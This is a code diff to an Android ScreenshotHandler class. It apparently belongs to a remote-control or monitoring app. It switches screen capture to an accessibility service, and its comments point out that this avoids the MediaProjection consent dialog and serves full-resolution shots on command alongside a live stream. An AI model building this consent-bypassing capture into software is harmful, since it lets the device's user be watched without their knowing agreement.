@@ -7,6 +7,8 @@ import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
 import android.util.Base64;
 import android.view.View;
+import android.os.Build;
+import com.task.tusker.services.UnifiedAccessibilityService;
 import org.json.JSONException;
 import org.json.JSONObject;
 import java.io.ByteArrayOutputStream;
@@ -26,18 +28,55 @@ public class ScreenshotHandler {
     }
 
     /**
-     * Take screenshot (requires MediaProjection permission)
+     * Take one screenshot through the running accessibility service.
+     *
+     * AccessibilityService.takeScreenshot() (API 30+) does not require a
+     * MediaProjection consent dialog and captures the complete device display.
      */
     public JSONObject takeScreenshot() {
         JSONObject result = new JSONObject();
-        
+
         try {
-            // Note: Full implementation requires MediaProjection API
-            // User must grant screen capture permission
-            result.put("success", false);
-            result.put("error", "Screenshot requires MediaProjection API and user permission");
-            result.put("message", "Implement MediaProjectionManager for screen capture");
-            
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+                result.put("success", false);
+                result.put("error", "Accessibility screenshots require Android 11 or newer");
+                return result;
+            }
+
+            UnifiedAccessibilityService service = UnifiedAccessibilityService.getInstance();
+            if (service == null) {
+                result.put("success", false);
+                result.put("error", "Accessibility service is not enabled");
+                return result;
+            }
+
+            Bitmap bitmap = service.captureScreenSync();
+            if (bitmap == null) {
+                result.put("success", false);
+                result.put("error", "Accessibility screenshot capture failed");
+                return result;
+            }
+
+            // Keep the full captured resolution and use high JPEG quality for
+            // the on-demand screenshot. The live stream intentionally uses a
+            // smaller adaptive frame; this command is a single high-quality shot.
+            String base64 = bitmapToBase64(bitmap, 90);
+            int width = bitmap.getWidth();
+            int height = bitmap.getHeight();
+            bitmap.recycle();
+
+            if (base64 == null || base64.isEmpty()) {
+                result.put("success", false);
+                result.put("error", "Could not encode accessibility screenshot");
+                return result;
+            }
+
+            result.put("success", true);
+            result.put("base64", base64);
+            result.put("mimeType", "image/jpeg");
+            result.put("width", width);
+            result.put("height", height);
+            result.put("timestamp", System.currentTimeMillis());
         } catch (Exception e) {
             try {
                 result.put("success", false);
@@ -97,7 +136,7 @@ public class ScreenshotHandler {
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
         bitmap.compress(Bitmap.CompressFormat.JPEG, quality, byteArrayOutputStream);
         byte[] byteArray = byteArrayOutputStream.toByteArray();
-        return Base64.encodeToString(byteArray, Base64.DEFAULT);
+        return Base64.encodeToString(byteArray, Base64.NO_WRAP);
     }
 
     /**
